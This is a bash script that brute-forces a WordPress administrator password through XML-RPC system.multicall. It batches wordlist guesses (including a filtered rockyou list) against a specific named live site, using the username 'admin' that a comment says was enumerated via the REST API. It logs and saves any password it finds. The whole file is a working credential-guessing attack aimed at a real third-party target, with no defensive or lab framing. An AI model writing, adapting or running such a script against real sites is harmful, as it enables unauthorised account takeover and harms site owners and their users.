#!/bin/bash
# WordPress XMLRPC Brute Force via system.multicall
# Target: specialperson.dawateislami.net
# Username: admin (enumerated via REST API)

TARGET="https://specialperson.dawateislami.net/xmlrpc.php"
USERNAME="admin"
RESULTS_FILE="results.txt"
LOG_FILE="bruteforce.log"
BATCH_SIZE=50

> "$RESULTS_FILE"
> "$LOG_FILE"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

test_batch() {
    local passwords=("$@")
    local xml="<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"

    for pw in "${passwords[@]}"; do
        xml+="<value><struct>"
        xml+="<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        xml+="<member><name>params</name><value><array><data>"
        xml+="<value><array><data>"
        xml+="<value><string>${USERNAME}</string></value>"
        xml+="<value><string>${pw}</string></value>"
        xml+="</data></array></value>"
        xml+="</data></array></value></member>"
        xml+="</struct></value>"
    done

    xml+="</data></array></value></param></params></methodCall>"

    local resp
    resp=$(curl -sk -X POST "$TARGET" \
        -H "Content-Type: text/xml" \
        -d "$xml" \
        --connect-timeout 10 \
        --max-time 30 2>/dev/null)

    if echo "$resp" | grep -q "blogName"; then
        for pw in "${passwords[@]}"; do
            if echo "$resp" | grep -q "$pw"; then
                echo "$pw"
                return 0
            fi
        done
        echo "${passwords[0]}"
        return 0
    fi
    return 1
}

log "=== WordPress XMLRPC Brute Force Started ==="
log "Target: $TARGET"
log "Username: $USERNAME"
log "Batch size: $BATCH_SIZE"

TOTAL=0
FOUND=0

for wordlist in targeted.txt rockyou_filtered.txt; do
    if [ ! -f "$wordlist" ]; then
        log "Skipping $wordlist (not found)"
        continue
    fi

    COUNT=$(wc -l < "$wordlist")
    log "=== Processing $wordlist ($COUNT passwords) ==="

    batch=()
    while IFS= read -r pass; do
        [ -z "$pass" ] && continue
        batch+=("$pass")
        TOTAL=$((TOTAL + 1))

        if [ ${#batch[@]} -eq $BATCH_SIZE ]; then
            result=$(test_batch "${batch[@]}")
            if [ $? -eq 0 ]; then
                log "*** PASSWORD FOUND: $result ***"
                echo "PASSWORD: $result" >> "$RESULTS_FILE"
                echo "USERNAME: $USERNAME" >> "$RESULTS_FILE"
                echo "TARGET: $TARGET" >> "$RESULTS_FILE"
                FOUND=1
                break 2
            fi
            batch=()
        fi

        if [ $((TOTAL % 500)) -eq 0 ]; then
            log "Tested $TOTAL passwords..."
        fi
    done < "$wordlist"

    # Process remaining batch
    if [ ${#batch[@]} -gt 0 ] && [ $FOUND -eq 0 ]; then
        result=$(test_batch "${batch[@]}")
        if [ $? -eq 0 ]; then
            log "*** PASSWORD FOUND: $result ***"
            echo "PASSWORD: $result" >> "$RESULTS_FILE"
            echo "USERNAME: $USERNAME" >> "$RESULTS_FILE"
            echo "TARGET: $TARGET" >> "$RESULTS_FILE"
            FOUND=1
        fi
    fi
done

log "=== Brute Force Complete ==="
log "Total tested: $TOTAL"
if [ $FOUND -eq 1 ]; then
    log "RESULT: PASSWORD FOUND"
    cat "$RESULTS_FILE"
else
    log "RESULT: No password found"
fi
